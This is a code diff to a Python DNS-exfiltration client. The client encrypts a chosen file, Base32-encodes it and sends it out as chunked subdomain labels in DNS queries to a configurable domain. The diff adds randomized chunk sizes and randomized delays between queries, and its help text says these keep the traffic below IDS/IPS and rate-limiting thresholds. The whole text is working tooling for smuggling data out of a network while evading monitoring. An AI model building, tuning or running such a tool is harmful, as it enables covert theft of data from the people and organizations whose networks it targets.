@@ -23,7 +23,10 @@ import logging
 import os
 import socket
 import sys
+import time
 from uuid import uuid4
+import math
+import random
 
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
@@ -40,6 +43,8 @@ logger = logging.getLogger('client')
 # Constants
 MAX_RETRIES = 3
 DNS_IP = '192.0.2.1'
+
+
 
 
 def load_server_public_key(path):
@@ -84,16 +89,54 @@ def base32_encode(data):
     b32 = base64.b32encode(data).decode('ascii')
     return b32.rstrip('=')
 
+def chunk_payload(b32_string, identifier, domain, *, min_size=16, max_label_len=52):
+    """
+    Split Base32 string into DNS-safe subdomain labels of the form
+      <identifier>-<idx>-<total>-<chunk>
+    with each label <= max_label_len characters and chunk lengths randomized
+    between min_size and the per-label maximum.
+    """
 
-def chunk_payload(b32_string, identifier, domain):
-    """
-    Split Base32 string into DNS-safe subdomains.
-    """
-    max_label = 63 - (len(identifier) + len(domain) + 2)
-    segments = [b32_string[i:i + max_label] for i in range(0, len(b32_string), max_label)]
+    # Estimate total segments if we used min_size chunks,
+    # so we know how many digits “total” will consume.
+    est_segments = max(1, math.ceil(len(b32_string) / min_size))
+    tot_digits   = len(str(est_segments))
+
+    segments = []
+    pos = 0
+    idx = 0
+
+    # First pass: carve out all the data‐chunks
+    while pos < len(b32_string):
+        idx_digits = len(str(idx))
+        # overhead = len(id) + digits(idx) + digits(total) + 3 hyphens
+        overhead = len(identifier) + idx_digits + tot_digits + 3
+        available = max_label_len - overhead
+        if available < min_size:
+            raise ValueError(
+                f"max_label_len={max_label_len} too small for min_size={min_size}"
+            )
+        # pick a random size in [min_size, available]
+        size = random.randint(min_size, available)
+        segments.append(b32_string[pos:pos + size])
+        pos += size
+        idx += 1
+
     total = len(segments)
+
+    # Second pass: yield the properly formatted labels
     for idx, seg in enumerate(segments):
         yield f"{identifier}-{idx}-{total}-{seg}"
+
+# def chunk_payload(b32_string, identifier, domain):
+#     """
+#     Split Base32 string into DNS-safe subdomains.
+#     """
+#     max_label = 63 - (len(identifier) + len(domain) + 2)
+#     segments = [b32_string[i:i + max_label] for i in range(0, len(b32_string), max_label)]
+#     total = len(segments)
+#     for idx, seg in enumerate(segments):
+#         yield f"{identifier}-{idx}-{total}-{seg}"
 
 
 def send_query(subdomain, args):
@@ -123,6 +166,7 @@ def reliable_send(subdomain, args):
     """
     for attempt in range(1, MAX_RETRIES + 1):
         if send_query(subdomain, args):
+            logger.info(f"Sent {subdomain} successfully")
             return True
         logger.info(f"Retry {attempt} for {subdomain}")
     return False
@@ -160,6 +204,7 @@ def main(args):
     # Send data chunks
     failures = []
     for sub in chunk_payload(b32, identifier, args.domain):
+        time.sleep(random.uniform(args.low, args.high) / 1000.0)
         if not reliable_send(sub, args):
             failures.append(sub)
 
@@ -175,6 +220,8 @@ def parse_args():
     p.add_argument('--server-port', type=int, default=5300)
     p.add_argument('--file-path', required=True)
     p.add_argument('--domain', default='xf.example.com')
+    p.add_argument('--low', type=int, default=500, help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
+    p.add_argument('--high', type=int, default=1000, help='Should be adjusted to maintain a QPS of 1-2 queries per second.')
     p.add_argument('--server-pubkey', default=os.getenv('SERVER_PUBLIC_KEY'), help='Path to server public key')
     return p.parse_args()
 
